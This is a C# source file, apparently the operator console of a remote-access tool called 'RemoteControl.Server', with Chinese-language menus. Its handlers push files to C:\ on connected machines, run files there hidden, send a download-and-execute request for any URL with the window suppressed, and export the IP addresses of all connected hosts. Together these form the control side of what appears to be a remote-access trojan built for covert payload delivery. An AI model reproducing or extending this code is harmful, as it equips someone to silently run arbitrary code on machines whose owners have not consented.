using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;

namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        // ---- 其他功能 事件处理 ----
        private void onMenuLocalUpload(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "选择要上传的文件";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                var req = new RequestStartUploadHeader();
                req.From = ofd.FileName;
                req.To = "C:\\" + Path.GetFileName(ofd.FileName);
                req.Id = Guid.NewGuid().ToString();
                currentSession.Send(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, req);
            }
        }

        private void onMenuShowOpen(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "选择要打开的文件";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                currentSession.Send(ePacketType.PACKET_RUN_FILE_REQUEST, new RequestRunFile { FilePath = ofd.FileName, Mode = eRunFileMode.Show });
            }
        }

        private void onMenuHiddenOpen(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "选择要隐藏打开的文件";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                currentSession.Send(ePacketType.PACKET_RUN_FILE_REQUEST, new RequestRunFile { FilePath = ofd.FileName, Mode = eRunFileMode.Hide });
            }
        }

        private void onMenuOpenUrl(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            buttonOpenUrl_Click(sender, e);
        }

        private void onMenuDownloadExec(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmInputUrl frm = new FrmInputUrl();
            frm.ShowDialog();
            if (!string.IsNullOrEmpty(frm.InputText))
            {
                currentSession.Send(ePacketType.PACKET_DOWNLOAD_EXEC_REQUEST, new RequestDownloadExec { Url = frm.InputText, ShowWindow = false });
            }
        }

        private void onMenuDownloadUpdate(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmInputUrl frm = new FrmInputUrl();
            frm.ShowDialog();
            if (!string.IsNullOrEmpty(frm.InputText))
            {
                currentSession.Send(ePacketType.PACKET_DOWNLOAD_EXEC_REQUEST, new RequestDownloadExec { Url = frm.InputText, ShowWindow = false });
            }
        }

        private void onMenuCopyIP(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            Clipboard.SetText(currentSession.GetSocketIPById());
        }

        private void onMenuCopyAllInfo(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            string info = string.Format("IP: {0}\r\n主机名: {1}\r\n路径: {2}",
                currentSession.GetSocketIPById(), currentSession.HostName, currentSession.AppPath);
            Clipboard.SetText(info);
        }

        private void onMenuExportIPList(object sender, EventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            foreach (TreeNode node in InternetTreeNode.Nodes)
            {
                var session = node.Tag as SocketSession;
                if (session != null)
                    sb.AppendLine(session.GetSocketIPById());
            }
            if (sb.Length > 0)
            {
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.Filter = "文本文件|*.txt";
                sfd.FileName = "IP列表.txt";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(sfd.FileName, sb.ToString());
                }
            }
        }
    }
}
